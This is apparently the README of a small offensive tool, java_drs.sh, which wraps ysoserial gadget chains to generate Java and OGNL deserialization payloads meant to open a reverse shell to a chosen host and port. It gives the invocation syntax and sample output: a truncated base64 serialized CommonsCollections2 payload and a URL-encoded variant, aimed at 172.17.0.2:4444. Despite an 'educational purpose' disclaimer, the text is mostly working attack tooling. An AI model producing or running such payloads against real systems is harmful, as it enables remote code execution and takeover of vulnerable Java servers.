# Java/OGNL Deserialization Reverse Shell Payload Generator
*This mini tool is for educational and research purpose only.*  
*I am not responsible for any improper use.*

The goal is to provide a different way to launch a reverse shell leveraging
unsecure payload deserialization.  
You need to identify the payload for the deserialization library from the 
[ysoserial page](https://github.com/frohoff/ysoserial#usage).  
  
Once done that you can launch simply the script :
```
$ java_drs.sh <ysoserial payload> <lhost> <lport> [url_enc_stream]
```

The script `java_drs.sh` will generate 1 Java and 2 OGNL payloads which 
hopefully will give you a reverse shell.
  
#### Note 1
**The output is supporting also OGNL format and can be urlencoded as a byte stream.**  
#### Note 2
You still need to insert the code generated into the PoC exploit code.  
This script was done to speedup the process of payload generation which can be 
complex and error likely.
#### Note 3
OGNL code hasn't been tested. Should work btw on vulnerable environments.

## Example
```
$ ./java_drs.sh CommonsCollections2 172.17.0.2 4444

=================================== JAVA CODE ===================================
String gdavi="rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAQm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQuY29tcGFyYXRvcnMuVHJhbnNmb3JtaW5nQ29tcGFyYXRvci/5hPArsQjMAgACTAAJZGVjb3JhdGVkcQB+AAFMAAt0cmFuc2Zvcm1lcnQALUxvcmcvYXBhY2h...
```
```
$ ./java_drs.sh CommonsCollections2 172.17.0.2 4444 url_enc_stream

=================================== JAVA CODE ===================================
%53%74%72%69%6e%67%20%67%64%61%76%69%3d%22%72%4f%30%41%42%58%4e%79%41%42%64%71%59%58%5a%68%4c%6e%56%30%61%57%77%75%55%48%4a%70%62%33%4a%70%64%48%6c%52%64%57%56%31%5a%5a%54%61%4d%4c%54%37%50%34%4b%78%41%77%41%43%53%51%41%45%63%32%6c%36%5a%55%77%41%43%6d%4e%76%62%58%42%68%63%6d%46%30%62%33%4a%30%...
```